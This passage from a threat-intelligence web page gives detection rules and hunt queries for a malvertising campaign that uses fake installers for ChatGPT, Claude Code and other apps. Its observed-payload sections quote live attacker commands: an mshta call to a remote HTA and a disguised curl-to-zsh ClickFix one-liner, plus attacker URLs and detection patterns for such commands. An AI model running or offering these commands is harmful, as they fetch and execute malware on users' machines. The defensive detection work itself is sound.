<div id="mi-chart-lures"></div>
{% endif %}

<!-- ── Detections ────────────────────────────────────────────────────── -->
<h2 id="detections">Detection Recommendations</h2>
<p>Each recommendation maps to the ATT&CK technique it detects. Execution-layer rules survive brand rotation; domain blocklists do not.</p>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-1">T1036.005</span>
    <div>
      <div class="det-rec-title">PE OriginalFilename mismatch</div>
      <div class="det-rec-desc">Alert when a process OriginalFilename from the PE version resource does not match its running filename. Adversaries rename malicious binaries - they rarely recompile with matching resources.</div>
    </div>
  </div>
  <details>
    <summary>Example detection logic</summary>
<pre class="mi-payload-example"><code>title: Masqueraded Installer OriginalFilename Mismatch
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\ChatGPT_Installer.exe'
      - '\ZoomInstaller.exe'
      - '\DiscordSetup.exe'
    CurrentDirectory|contains:
      - '\Downloads\'
      - '\AppData\Local\Temp\'
  filter_legit:
    OriginalFileName|contains:
      - 'ChatGPT'
      - 'Zoom'
      - 'Discord'
  condition: selection and not filter_legit
level: high</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-1">T1553.002</span>
    <div>
      <div class="det-rec-title">Shell-company signed binary from user download path</div>
      <div class="det-rec-desc">A signed binary executing from Downloads after a browser spawn is more anomalous than unsigned execution in managed environments. Legitimate signed software deploys via IT tooling, not user download directories. MROScanner OU is a known shell-company signer pattern.</div>
    </div>
  </div>
  <details>
    <summary>Observed signers (1)</summary>
<pre class="mi-payload-example"><code>ChatGPT_Installer.exe
Signer: MROScanner OU (Tallinn, EE)
CA: SSL.com Code Signing Intermediate CA RSA R1
Thumbprint: E3B6CF111525417CE68C1CBE99E257DBAC54D071
Valid: 2026-04-22 to 2027-04-21</code></pre>
  </details>
  <details>
    <summary>Example detection logic</summary>
<pre class="mi-payload-example"><code>title: Signed Installer Executed From Downloads After Browser Spawn
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\chrome.exe'
      - '\msedge.exe'
      - '\firefox.exe'
  selection_installer:
    Image|endswith:
      - '\setup.exe'
      - '\installer.exe'
      - '\install.exe'
    CurrentDirectory|contains: '\Downloads\'
    Signed: 'true'
  filter_known_vendors:
    SignatureStatus: 'Valid'
    Signature|contains:
      - 'Microsoft'
      - 'Google'
      - 'Zoom'
  condition: selection_parent and selection_installer and not filter_known_vendors
level: high</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-1">T1218.005</span>
    <div>
      <div class="det-rec-title">mshta fetching HTA from non-enterprise URL</div>
      <div class="det-rec-desc"><code>mshta.exe</code> spawned from <code>cmd.exe</code>, Run dialog, or terminal context fetching an HTA from an external domain. Covers Claude Code ClickFix Windows delivery via <code>download.version-516.com/claude</code>.</div>
    </div>
  </div>
  <details>
    <summary>Observed payloads (1)</summary>
<pre class="mi-payload-example"><code>mshta https://download.version-516.com/claude</code></pre>
  </details>
  <details>
    <summary>Example detection logic</summary>
<pre class="mi-payload-example"><code>title: Mshta Executing Remote HTA From Unusual Parent
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'http://'
      - 'https://'
  selection_parent:
    ParentImage|endswith:
      - '\cmd.exe'
      - '\explorer.exe'
      - '\WindowsTerminal.exe'
  filter_enterprise:
    CommandLine|contains:
      - '.microsoft.com'
      - '.windows.com'
  condition: selection and selection_parent and not filter_enterprise
level: high</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-1">T1059.004</span>
    <div>
      <div class="det-rec-title">curl piped to shell from terminal (Mac developer targeting)</div>
      <div class="det-rec-desc">Detect <code>curl -s ... | zsh</code> or <code>curl ... | bash</code> where the URL domain is not a known package manager or vendor CDN. Claude Code install modal uses base64-concealed curl URLs on attacker-controlled domains.</div>
    </div>
  </div>
  <details>
    <summary>Observed payloads (2)</summary>
<pre class="mi-payload-example"><code># Social cover echo + malicious curl (Mac)
echo "Downloading Claude: https://claude.ai/install.sh" && curl -s $(echo '&lt;base64&gt;' | openssl base64 -d -A) | zsh

# Decoded payload URL (uneifoifow variant)
https://xprssit.com/curl/6df71b43667a2d1d9de3e88cba7e16fb11b4ddf67af64b853b903b3fa8ead500</code></pre>
  </details>
  <details>
    <summary>Example detection logic</summary>
<pre class="mi-payload-example"><code>title: Curl Piped to Shell From Non-Vendor Domain
logsource:
  category: process_creation
  product: macos
detection:
  selection:
    Image|endswith:
      - '/curl'
      - '/zsh'
      - '/bash'
    CommandLine|contains|all:
      - 'curl'
      - '|'
  filter_vendors:
    CommandLine|contains:
      - 'anthropic.com'
      - 'homebrew.sh'
      - 'github.com'
  condition: selection and not filter_vendors
level: high</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-na">INFRA</span>
    <div>
      <div class="det-rec-title">Favicon hash pivoting for infrastructure clustering</div>
      <div class="det-rec-desc">From one confirmed fake domain: fetch favicon, compute Murmur3 hash, query Shodan/URLScan. Campaigns reusing stolen favicons across dozens of domains surface immediately. ChatGPT hunt: 158 hits on OpenAI favicon pivot; Claude: 1,003 hits.</div>
    </div>
  </div>
  <details>
    <summary>Example hunt queries</summary>
<pre class="mi-payload-example"><code># URLScan favicon pivot (ChatGPT)
hash:9747c13cd87b36ebf2ab567b9d0bc2ff49b5a4f46f4f51e4d053024f579fb9a0 AND NOT page.domain:openai.com

# URLScan favicon pivot (Claude)
hash:816a55828befeb50fe8a9556cb92d80194efefbd3f4e04ccf694992dd8e085e3 AND NOT page.domain:claude.ai

# Shodan
http.favicon.hash:&lt;mmh3_int&gt;</code></pre>
  </details>
</div>

<div class="det-rec">
  <div class="det-rec-header">
    <span class="det-rec-tier tier-na">INFRA</span>
    <div>
      <div class="det-rec-title">Affiliate tracking backend fingerprint</div>
      <div class="det-rec-desc">The <code>/init/tracking.php</code> + <code>/init/pixel.php</code> endpoint pattern with UTM parameters (<code>fbclid</code>, <code>bid</code>, <code>tid</code>) indicates a paid traffic malvertising campaign. If this PHP structure reappears on another fake download page, it connects campaigns to the same kit or operator.</div>
    </div>
  </div>
  <details>
    <summary>Example detection logic</summary>
<pre class="mi-payload-example"><code># Proxy / DNS - hunt for sibling sites
cs-uri-stem: '/init/tracking.php'
cs-method: 'POST'
cs-uri-query|contains:
  - 'utm_source='
  - 'fbclid='

# URLScan pivot
page.url:"/init/tracking.php" AND filename:*.exe</code></pre>
  </details>
</div>

</div><!-- /.mi-page / .trends-content -->
</div><!-- /.trends-layout -->

{% if site.data.masq_infra_history %}
<script>
  window.MASQ_HISTORY = {{ site.data.masq_infra_history | jsonify }};
</script>
<script src="{{ '/assets/js/masq-infra-history.js' | relative_url }}"></script>
{% endif %}

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/styles/atom-one-dark.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/highlight.min.js"></script>
<script>
(function() {
  var navLinks = document.querySelectorAll('.trends-sidebar a');
  if (!navLinks.length) return;
  var sections = Array.from(navLinks).map(function(l) {
    return document.querySelector(l.getAttribute('href'));
  }).filter(Boolean);
  var observer = new IntersectionObserver(function(entries) {
    entries.forEach(function(entry) {
      if (entry.isIntersecting) {
        navLinks.forEach(function(link) {
          link.classList.toggle('active', link.getAttribute('href') === '#' + entry.target.id);
        });
      }
    });
  }, { rootMargin: '-20% 0px -70% 0px' });
  sections.forEach(function(s) { observer.observe(s); });
})();

if (typeof hljs !== 'undefined') {
  document.querySelectorAll('.mi-payload-example code, .logic-block code').forEach(function(el) {
    var text = el.textContent || el.innerText;
    var lang = /logsource:|condition:/.test(text) ? 'yaml' : 'bash';
    el.className = 'language-' + lang;
    hljs.highlightElement(el);
  });
}
</script>
